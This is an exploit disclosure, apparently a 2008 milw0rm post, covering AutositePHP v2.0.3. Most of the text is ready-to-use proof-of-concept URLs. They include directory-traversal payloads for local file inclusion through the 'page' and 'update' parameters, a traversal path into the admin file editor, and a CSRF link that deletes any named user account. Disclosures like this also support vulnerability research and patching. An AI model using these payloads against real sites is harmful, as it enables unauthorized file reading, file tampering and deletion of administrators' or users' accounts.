@@ -1,0 +1,60 @@
+############################################################################################
+[+] AutositePHP v2.0.3 (LFI/CSRF/Edit File) Multiple Remote Vulnerabilities
+[+] Discovered By SirGod
+[+] Greetz : All my friends
+[+] Download Script : http://sourceforge.net/projects/autositephp/
+############################################################################################
+
+[+] Local File Inclusion
+
+    PoC 1 :
+
+      http://[target]/[path]/index.php?page=users/[Local File]
+
+    Example 1 :
+
+      http://127.0.0.1/path/index.php?page=users/../../../../boot.ini
+
+
+    PoC 2 :
+
+      http://[target]/[path]/index.php?page=users/login.php&update=update/[Local
+File]
+
+    Example 1 :
+
+      http://127.0.0.1/path/index.php?page=users/login.php&update=update/../../../../boot.ini
+
+
+[+] Edit File
+
+ - Need administrative permissions.You can edit files from the webserver.
+
+    PoC :
+
+      http://[target]/[path]/pages/Admin/File%20Editor/actions/modify.php?page=pages/[Local
+File]
+
+    Example :
+
+      http://127.0.0.1/path/pages/Admin/File%20Editor/actions/modify.php?page=pages/../../../../boot.ini
+
+
+[+] Cross Site Request Forgery
+
+
+  If a logged in user with administrator privileges clicks on the
+following url :
+
+     http://127.0.0.1/path/index.php?page=pages/Admin/Users/viewusers/delete.php&username=SirGod&submit=submit
+
+  The username SirGod will be deleted.You can change the username to another.
+
+     http://127.0.0.1/path/index.php?page=pages/Admin/Users/viewusers/delete.php&username=[USERNAME]&submit=submit
+
+[USERNAME] = name of account that you want to delete.
+
+
+############################################################################################
+
+# milw0rm.com [2008-12-14]
